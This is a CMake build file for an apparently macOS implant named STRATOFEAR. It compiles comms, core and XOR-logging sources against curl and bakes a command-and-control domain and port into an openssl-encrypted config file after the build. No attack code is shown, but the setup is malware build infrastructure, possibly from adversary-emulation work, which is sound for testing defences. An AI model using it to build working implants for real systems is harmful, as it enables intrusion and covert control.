add_executable(
  main
  main.cpp
  core.cpp
  comms.cpp
  ../util/XorLogger.cpp
  ../util/base64.cpp)

target_include_directories(main PUBLIC "${CMAKE_SOURCE_DIR}/src/modules" "${CMAKE_SOURCE_DIR}/include")

# Generates the configuration file
add_executable(
  configGenerator
  createConfig.cpp
)

add_dependencies(
  main
  configGenerator
)

# Add env variables for builds
target_compile_definitions(
  main PRIVATE
  CONFIG_PATH_ENV="${CONFIG_PATH_ENV}"
  CONFIG_FILENAME_ENV="${CONFIG_FILENAME_ENV}"
  $<$<CONFIG:Debug>:DEBUG>
)

target_compile_definitions(
  configGenerator PRIVATE
  CONFIG_PATH_ENV="${CONFIG_PATH_ENV}"
  CONFIG_FILENAME_ENV="${CONFIG_FILENAME_ENV}"
  CERT_PATH_ENV="${CERT_PATH_ENV}"
  HEADER_PATH_ENV="${HEADER_PATH_ENV}"
  $<$<CONFIG:Debug>:DEBUG>
)

target_sources(
    stratofear-test 
    PRIVATE
    "comms_test.cpp"
    "core_test.cpp"
)

add_dependencies(
  stratofear-test
  test_module
)

target_link_libraries(main ${CURL_LIBRARIES} "-framework CoreServices")

# Execute the config generator program to produce the network config file required for STRATOFEAR
add_custom_command(TARGET configGenerator POST_BUILD
    COMMAND configGenerator -d ${C2_DOMAIN}:${C2_PORT}
    COMMAND openssl enc -aes-128-cbc -pass pass:${CONFIG_ENC_KEY} -in config -out ${CONFIG_FILENAME_ENV}
    COMMAND cp ${CONFIG_FILENAME_ENV} ${CONFIG_FILENAME_ENV}.artifact
    COMMENT "Creating & encrypting config file as ${CONFIG_PATH_ENV} and making artifactory copy as ${CONFIG_PATH_ENV}.artifact"
)
